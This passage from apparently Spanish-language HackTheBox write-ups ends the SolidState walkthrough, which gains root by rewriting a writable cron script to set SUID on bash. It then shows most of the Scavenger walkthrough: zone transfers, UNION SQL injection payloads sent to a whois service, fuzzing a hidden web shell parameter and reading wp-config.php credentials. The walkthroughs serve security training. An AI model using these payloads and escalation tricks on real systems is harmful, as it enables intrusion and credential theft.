&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ssh mindy@10.10.10.51 -t bash
mindy@10.10.10.51's password: 
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ 
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ whoami
mindy
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ls
bin  user.txt
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cat user.txt 
5aadb8206e94c4471346a863bf006a4a
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;ELEVACION DE PRIVILEGIOS &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Enumarando el sistema no encontramos información interesante como archivos suid o privilegios de nuestro usuario. Por ello vamos a crearnos un &lt;code&gt;script&lt;/code&gt; en bash que nos permita ver tareas que se esten ejecutando en el sistema a intevalos regulares de tiempo al que llamaremos &lt;code&gt;procmon.sh&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;#!/bin/bash

old_process=$(ps -eo user,command)

while true; do
  new_process=$(ps -eo user,command)
  diff &amp;lt;(echo &quot;$old_process&quot;) &amp;lt;(echo &quot;$new_process&quot;) | grep &quot;[\&amp;gt;\&amp;lt;]&quot; | grep -vE &quot;kworker|procmon|command&quot;
  old_process=$new_process
done
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ejecutamos el script y despues de unos minutos vemos que el usuario &lt;code&gt;root&lt;/code&gt; esta ejecutando un script &lt;code&gt;tmp.py&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ ./procmon.sh 
&amp;gt; root     /usr/sbin/CRON -f
&amp;lt; root     /usr/sbin/CRON -f
c^C
${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ ls
${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ cd /dev/shm
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ nano procmon.sh
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ chmod +x procmon.sh 
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ ./procmon.sh 
&amp;gt; root     /usr/sbin/CRON -f
&amp;gt; root     /bin/sh -c python /opt/tmp.py
&amp;gt; root     python /opt/tmp.py
&amp;lt; root     /usr/sbin/CRON -f
&amp;lt; root     /bin/sh -c python /opt/tmp.py
&amp;lt; root     python /opt/tmp.py
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si inspeccionamos los permisos del archivo, podemos ver que tenemos capacidad de escritura, quiere decir que podemos modificarlo y al cabo de unos minutos el usuario &lt;code&gt;root&lt;/code&gt; sera el que lo ejecute.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ ls -l /opt/tmp.py 
-rwxrwxrwx 1 root root 105 Aug 22  2017 /opt/tmp.py
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vamos a modificarlo para que al ejecutar otorgue el permiso &lt;code&gt;suid&lt;/code&gt; a la bash.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ cat /opt/tmp.py
#!/usr/bin/env python
import os
os.system(&quot;chmod u+s /bin/bash&quot;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Esperamos unos minutos y vemos que ahora la bash ya cuenta con el permisos &lt;code&gt;suid&lt;/code&gt;, ahora podemos convertirnos en el usuario &lt;code&gt;root&lt;/code&gt; , ir a su directorio personal y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1265272 May 15  2017 /bin/bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ bash -p
bash-4.4# whoami
root
bash-4.4# cd /root/
bash-4.4# cat root.txt 
1a0cd964c524d89ebe2a7d630f938518
&lt;/code&gt;&lt;/pre&gt;

</description>
        <pubDate>Sat, 24 Jun 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-SolidState</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-SolidState</guid>
        
        <category>Information Leaked</category>
        
        <category>Escaping Restricted Bash</category>
        
        <category>Abusing Cron Jobs</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Maquina Scavenger - htb writeup</title>
        <description>&lt;p&gt;Hola de nuevo el dia de hoy vamos a resolver la máquina &lt;code&gt;Scavenger&lt;/code&gt; de la plataforma de &lt;code&gt;hackthebox&lt;/code&gt; correspondiente a una maquina &lt;code&gt;linux&lt;/code&gt; de dificultad dificil, la cual explotaremos obteniendo subdomios mediante un ataque de transferencia de zona y inyecciones sql en el protocolo &lt;code&gt;whois&lt;/code&gt;, despues ganaremos acceso simulando una tty donde encontraremos credenciales que nos serviran para hacernos de recursos por ftp y donde analizaremos un archivo &lt;code&gt;pcap&lt;/code&gt; para descubrir un &lt;code&gt;rootkit&lt;/code&gt; ejecutandose en la maquina y a partir de este obtener privilegios maximos que nos permita obtener la flag del usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Scavenger
❯ ls
 Scavenger
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;ENUMERACION &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.155
PING 10.10.10.155 (10.10.10.155) 56(84) bytes of data.
64 bytes from 10.10.10.155: icmp_seq=1 ttl=63 time=123 ms

--- 10.10.10.155 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 123.005/123.005/123.005/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;63&lt;/code&gt;correspondiente a una maquina &lt;code&gt;linux&lt;/code&gt;, ahora procederemos a el escaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.155 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-23 22:11 GMT
Initiating SYN Stealth Scan at 22:11
Scanning 10.10.10.155 [65535 ports]
Discovered open port 22/tcp on 10.10.10.155
Discovered open port 21/tcp on 10.10.10.155
Discovered open port 80/tcp on 10.10.10.155
Discovered open port 53/tcp on 10.10.10.155
Discovered open port 43/tcp on 10.10.10.155
Completed SYN Stealth Scan at 22:12, 26.69s elapsed (65535 total ports)
Nmap scan report for 10.10.10.155
Host is up, received user-set (0.16s latency).
Scanned at 2023-06-23 22:11:41 GMT for 26s
Not shown: 65496 filtered tcp ports (no-response), 32 filtered tcp ports (port-unreach), 2 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
43/tcp open  whois   syn-ack ttl 63
53/tcp open  domain  syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.78 seconds
           Raw packets sent: 131040 (5.766MB) | Rcvd: 39 (2.604KB)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p21,22,43,53,80 10.10.10.155 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-23 22:12 GMT
Nmap scan report for 10.10.10.155
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0)
| ssh-hostkey: 
|   2048 df:94:47:03:09:ed:8c:f7:b6:91:c5:08:b5:20:e5:bc (RSA)
|   256 e3:05:c1:c5:d1:9c:3f:91:0f:c0:35:4b:44:7f:21:9e (ECDSA)
|_  256 45:92:c0:a1:d9:5d:20:d6:eb:49:db:12:a5:70:b7:31 (ED25519)
43/tcp open  whois?
| fingerprint-strings: 
|   GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest: 
|     % SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
|     more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
|     This query returned 0 object
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     % SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
|     more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
|_    1267 (HY000): Illegal mix of collations (utf8mb4_general_ci,IMPLICIT) and (utf8_general_ci,COERCIBLE) for operation 'like'
53/tcp open  domain  ISC BIND 9.10.3-P4 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Debian
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.25 (Debian)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 114.00 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Visulizamos informacion interesante de los puertos escaneados:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;21&lt;/td&gt;
      &lt;td&gt;FTP&lt;/td&gt;
      &lt;td&gt;vsftpd 3.0.3&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;SSH&lt;/td&gt;
      &lt;td&gt;OpenSSH 7.4p1 Debian 10+deb9u4&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;43&lt;/td&gt;
      &lt;td&gt;WHOIS&lt;/td&gt;
      &lt;td&gt;whois?&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;53&lt;/td&gt;
      &lt;td&gt;DNS&lt;/td&gt;
      &lt;td&gt;ISC BIND 9.10.3-P4&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;Apache httpd 2.4.25&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;explotación&quot;&gt;EXPLOTACION &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Observamos un servicio web ejecutandose en el puerto &lt;code&gt;80&lt;/code&gt; y en el puerto &lt;code&gt;43&lt;/code&gt; obtenemos un dominio que vamos a proceder a añadir en nuestro &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo &quot;10.10.10.155 supersechosting.htb www.supersechosting.htb&quot; &amp;gt;&amp;gt; /etc/hosts
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si ahora intentamos visualizar el servicio en el navegador se nos muestra un mensaje de que el servicio no esta disponible.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Scavenger/sca1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Scavenger/sca2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora ya que nmap tambien nos reporto que el puerto &lt;code&gt;53&lt;/code&gt; se encuentra abierto asi que con la herramienta &lt;code&gt;dig&lt;/code&gt; vamos a intentar realizar un ataque de transferencia de zona, para poder obtener dominios validos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ dig @10.10.10.155 supersechosting.htb axfr

; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.16.27-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; @10.10.10.155 supersechosting.htb axfr
; (1 server found)
;; global options: +cmd
supersechosting.htb.	604800	IN	SOA	ns1.supersechosting.htb. root.supersechosting.htb. 3 604800 86400 2419200 604800
supersechosting.htb.	604800	IN	NS	ns1.supersechosting.htb.
supersechosting.htb.	604800	IN	MX	10 mail1.supersechosting.htb.
supersechosting.htb.	604800	IN	A	10.10.10.155
ftp.supersechosting.htb. 604800	IN	A	10.10.10.155
mail1.supersechosting.htb. 604800 IN	A	10.10.10.155
ns1.supersechosting.htb. 604800	IN	A	10.10.10.155
whois.supersechosting.htb. 604800 IN	A	10.10.10.155
www.supersechosting.htb. 604800	IN	A	10.10.10.155
supersechosting.htb.	604800	IN	SOA	ns1.supersechosting.htb. root.supersechosting.htb. 3 604800 86400 2419200 604800
;; Query time: 436 msec
;; SERVER: 10.10.10.155#53(10.10.10.155)
;; WHEN: Fri Jun 23 22:23:59 GMT 2023
;; XFR size: 10 records (messages 1, bytes 275)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Obtenemos una lista de subdominios que validaremos, despues de añadirlos a nuestro &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo &quot;10.10.10.155 ftp.supersechosting.htb mail1.supersechosting.htb ns1.supersechosting.htb whois.supersechosting.htb www.supersechosting.htb&quot; &amp;gt;&amp;gt; /etc/hosts
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Logramos resolver un dominio, el cual nos da información acerca del servicio, como que se esta usando &lt;code&gt;php&lt;/code&gt; y &lt;code&gt;mysql&lt;/code&gt;, ademas tambien podemos ver información acerca de &lt;code&gt;whois&lt;/code&gt; que curiosamente tiene expuesto la maquina.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Scavenger/sca3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Al conectarnos a &lt;code&gt;whois&lt;/code&gt; a traves de telnet, vemos que utiliza como base de datos el servicio de &lt;code&gt;mariadb&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ telnet 10.10.10.155 43
Trying 10.10.10.155...
Connected to 10.10.10.155.
Escape character is '^]'.
 
% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
% This query returned 0 object
Connection closed by foreign host.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;El servicio &lt;code&gt;WHOIS&lt;/code&gt; siempre necesita utilizar una base de datos para almacenar y extraer la información. Por lo tanto, una posible &lt;code&gt;SQLInjection&lt;/code&gt; podría funcionar al consultar la base de datos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ nc 10.10.10.155 43
'
% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '''') limit 1' at line 1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Mandamos una &lt;code&gt;'&lt;/code&gt; en la consulta y vemos que recibimos un error de &lt;code&gt;sql&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ nc 10.10.10.155 43
') ORDER BY 2#
% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
% This query returned 0 object
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vamos a proceder a enumear la base de datos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ nc 10.10.10.155 43
') UNION SELECT database(), 2#
% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
% This query returned 1 object
whois

❯ nc 10.10.10.155 43
') UNION SELECT table_name,2 from information_schema.tables where table_schema='whois'#
% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
% This query returned 1 object
customers

❯ nc 10.10.10.155 43
') UNION SELECT column_name, 2 from information_schema.columns where table_name=&quot;customers&quot; and table_schema=&quot;whois&quot; LIMIT 0,1#
% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
% This query returned 1 object
id^C

❯ nc 10.10.10.155 43
') UNION SELECT column_name, 2 from information_schema.columns where table_name=&quot;customers&quot; and table_schema=&quot;whois&quot; LIMIT 1,1#
% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
% This query returned 1 object
domain^C

❯ nc 10.10.10.155 43
') UNION SELECT column_name, 2 from information_schema.columns where table_name=&quot;customers&quot; and table_schema=&quot;whois&quot; LIMIT 2,1#
% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
% This query returned 1 object
data

❯ nc 10.10.10.155 43
') UNION SELECT domain, 2 FROM  customers#
% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
% This query returned 4 object
supersechosting.htbjustanotherblog.htbpwnhats.htbrentahacker.htb
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Encontramos mas subdominios y entre ellos uno curioso &lt;code&gt;rentahacker.htb&lt;/code&gt;, que si lo vemos en la pagina web no nos muestra información, pero podemos ejecutar un ataque de transferencia de zona de este subdominio.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ dig @10.10.10.155 rentahacker.htb axfr

; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.16.27-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; @10.10.10.155 rentahacker.htb axfr
; (1 server found)
;; global options: +cmd
rentahacker.htb.	604800	IN	SOA	ns1.supersechosting.htb. root.supersechosting.htb. 4 604800 86400 2419200 604800
rentahacker.htb.	604800	IN	NS	ns1.supersechosting.htb.
rentahacker.htb.	604800	IN	MX	10 mail1.rentahacker.htb.
rentahacker.htb.	604800	IN	A	10.10.10.155
mail1.rentahacker.htb.	604800	IN	A	10.10.10.155
sec03.rentahacker.htb.	604800	IN	A	10.10.10.155
www.rentahacker.htb.	604800	IN	A	10.10.10.155
rentahacker.htb.	604800	IN	SOA	ns1.supersechosting.htb. root.supersechosting.htb. 4 604800 86400 2419200 604800
;; Query time: 443 msec
;; SERVER: 10.10.10.155#53(10.10.10.155)
;; WHEN: Fri Jun 23 22:49:07 GMT 2023
;; XFR size: 8 records (messages 1, bytes 251)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Obtenemos dos subdominios nuevos que luego de añadirlos, visualizamos una pagina en &lt;code&gt;sec03.rentahacker.htb&lt;/code&gt; con una imagen en relación a un hacker que ya nos da que pensar.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Scavenger/sca4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Anteriormente en uno de los subdominios vemos que se estaba utilizando como lenguaje a &lt;code&gt;php&lt;/code&gt;, asi que vamos a tratar de buscar archivos con esa extensión con la ayuda de &lt;code&gt;wfuzz&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://sec03.rentahacker.htb/FUZZ.php
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://sec03.rentahacker.htb/FUZZ.php
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000000015:   302        0 L      0 W        0 Ch        &quot;index&quot;                                                                                                               
000000217:   200        57 L     340 W      4729 Ch     &quot;signup&quot;                                                                                                              
000000027:   302        0 L      0 W        0 Ch        &quot;search&quot;                                                                                                              
000000053:   200        57 L     339 W      4712 Ch     &quot;login&quot;                                                                                                               
000000685:   200        0 L      0 W        0 Ch        &quot;core&quot;                                                                                                                
000000190:   200        57 L     332 W      4667 Ch     &quot;wiki&quot;                                                                                                                
000001688:   200        0 L      0 W        0 Ch        &quot;shell&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Encontramos un archivo con un nombre muy descriptivo &lt;code&gt;shell&lt;/code&gt; que curiosamente existe, y quiero pensar que al ser una shell debe ejecutarse a traves de un parametro que si bien no sabemos el nombre, con &lt;code&gt;wfuzz&lt;/code&gt; igualmente podemos tratar de averiguarlo ejecutando un comando.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Scavenger/sca5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ wfuzz -c --hc=404 -t 200 --hw=0 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt &quot;http://sec03.rentahacker.htb/shell.php?FUZZ=whoami&quot;
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://sec03.rentahacker.htb/shell.php?FUZZ=whoami
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000012593:   200        1 L      1 W        8 Ch        &quot;hidden&quot;                                                                                                              
000014350:   200        0 L      0 W        0 Ch        &quot;guildwars&quot;                                                                                                           
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Obtenemos que el nombre parametro corresponde a &lt;code&gt;hidden&lt;/code&gt; y si lo validamos tenemos ejecución de comandos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Scavenger/sca6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si ahora tratamos de mandarnos una reverse shell a nuestra maquina, vemos que nos resulta imposible debido a que la maquina tiene implementado reglas de firewall. Por ello para poder movernos de manera mas comoda vamos a usar una herramienta que nos permite tener acceso a una &lt;code&gt;tty&lt;/code&gt; sobre http.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/s4vitar/ttyoverhttp/blob/master/tty_over_http.py&quot;&gt;https://github.com/s4vitar/ttyoverhttp/blob/master/tty_over_http.py&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Para usarla simplemente debemos modificar la dirección url y el parametro al que corresponde nuestra shell.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Scavenger/sca7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ rlwrap python3 tty_over_http.py
whoami
&amp;gt; ib01c03
ls -l /home
&amp;gt; total 24
drwx------ 4 ib01c01 customers 4096 Sep  1  2021 ib01c01
drwx------ 3 ib01c02 customers 4096 Sep  1  2021 ib01c02
drwx------ 4 ib01c03 customers 4096 Sep  1  2021 ib01c03
dr-xrwx--- 3 ib01ftp support   4096 Dec 10  2018 ib01ftp
drwx------ 3 ib01www support   4096 Dec 10  2018 ib01www
drwx------ 2 support support   4096 Sep 13  2022 support
ls -l /home/ib01c03
&amp;gt; total 26576
-rw-r--r--  1 ib01c03 customers 16689687 Oct 17  2018 bugtracker.2.18.tgz
drwxr-xr-x 15 ib01c03 customers    12288 Dec 10  2018 sec03
-rw-r--r--  1 ib01c03 customers 10503584 Dec  6  2018 wordpress.tgz
drwxr-xr-x  5 ib01c03 customers     4096 Sep  1  2021 www
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos un archivo comprimido en &lt;code&gt;wordpress&lt;/code&gt;, asi que podemos tratar de buscar el archivo &lt;code&gt;wp-config.php&lt;/code&gt; que generalmente contiene credenciales.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;find / -name wp-config.php 2&amp;gt;/dev/null
&amp;gt; /home/ib01c03/www/wp-config.php
cat /home/ib01c03/www/wp-config.php
&amp;gt; &amp;lt;?php
 The name of the database for WordPress /
define('DB_NAME', 'ib01c03');

 MySQL database username /
define('DB_USER', 'ib01c03');

 MySQL database password /
define('DB_PASSWORD', 'Thi$sh1tIsN0tGut');

 MySQL hostname /
define('DB_HOST', 'localhost');
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Obtenemos unas credenciales validas pero que correspoden al mismo usuario &lt;code&gt;ib01c03&lt;/code&gt;, ahora recordemos que cuando obtuvimos subdominios, se nos reporto uno asociado a &lt;code&gt;mail1.rentahacker.htb&lt;/code&gt;, por ello podemos listar la ruta &lt;code&gt;/var/spool/mail&lt;/code&gt; buscando información.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;ls -l /var/spool/mail/*
&amp;gt; -rw-rw-r-- 1 root mail 1274 Dec 10  2018 /var/spool/mail/ib01c03
-rw-rw---- 1 root mail 1043 Dec 11  2018 /var/spool/mail/support
&lt;/code&gt;&lt;/pre&gt;

